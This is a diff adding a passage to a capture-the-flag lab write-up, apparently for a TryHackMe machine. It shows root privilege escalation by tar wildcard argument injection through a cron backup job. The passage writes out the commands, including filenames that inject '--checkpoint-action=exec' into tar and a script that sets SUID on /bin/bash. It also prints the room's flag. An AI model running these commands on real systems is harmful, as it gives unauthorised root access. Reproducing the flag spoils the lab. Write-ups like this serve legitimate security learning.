@@ -137,3 +137,27 @@ After that comes privilege escalation. We try sudo -l but are prompted for a pas
 ![](/images/MaskdMafia/vulnet3.png)
 
 We see that it makes a backup of everything in the Document folder routinely.
+
+Basically,it is a **CronJob** file.I searched about this in the web and here's what I found.
+https://int0x33.medium.com/day-67-tar-cron-2-root-abusing-wildcards-for-tar-argument-injection-in-root-cronjob-nix-c65c59a77f5e
+
+What this script does is basically,it creates backup of every file within the Downloads directory of the user.After reading the article I ran the commands given in the blog 
+
+![](/images/vul4.png)
+and ran /bin/bash -p  but it didin't work.
+
+So,I changed my commnads a bit and used this instead.
+
+```echo "chmod +s /bin/bash" > privesc.sh```
+
+```echo "" > "--checkpoint-action=exec=sh privesc.sh"```
+
+```echo "" > --checkpoint=1```
+
+then,I ran /bin/bash -p and here's we get the root priviledges.
+
+![](/images/vul5.png)
+
+Congo, we get the flag,
+
+***THM{220b671dd8adc301b34c2738ee8295ba}***
